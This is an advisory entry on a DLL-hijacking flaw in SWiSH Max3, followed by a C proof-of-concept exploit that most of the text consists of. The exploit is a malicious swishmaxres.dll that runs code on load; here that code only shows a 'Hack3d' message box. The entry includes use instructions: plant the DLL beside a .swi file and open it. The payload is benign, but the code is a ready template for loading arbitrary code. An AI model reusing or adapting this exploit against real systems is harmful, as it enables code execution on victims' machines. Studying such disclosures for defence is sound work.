source: http://www.securityfocus.com/bid/43332/info

SWiSH Max3 is prone to a vulnerability that lets attackers execute arbitrary code.

An attacker can exploit this issue by enticing a legitimate user to use the vulnerable application to open a file from a network share location that contains a specially crafted Dynamic Link Library (DLL) file.

SWiSH Max3 is vulnerable; other versions may also be affected. 

/*
#SWiSHmax DLL Hijacking Exploit (swishmaxres.dll)
#Author : anT!-Tr0J4n
#Greetz : Dev-PoinT.com $ GlaDiatOr $ SILVER STAR $ Coffin Of Evil $ HoBeeZ $ Mr.Mh$TEr $ ?Own3d $ Cyber-Err0r $ Nashy $ all My Friends
#contact: D3v-PoinT@hotmail.com & C1EH@Hotmail.com
#Tested on: Windows XP sp3
 
#How to use : Place a .swi file and swishmaxres.dll in same folder and execute .swi file in
 
#swishmaxres.dll (code)
*/
 
#include "stdafx.h"
 
void init() {
MessageBox(NULL,"anT!-Tr0J4n", "Hack3d",0x00000003);
}
 
 
BOOL APIENTRY DllMain( HANDLE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
 )
{
    switch (ul_reason_for_call)
{
case DLL_PROCESS_ATTACH:
 init();break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
 case DLL_PROCESS_DETACH:
break;
    }
    return TRUE;
}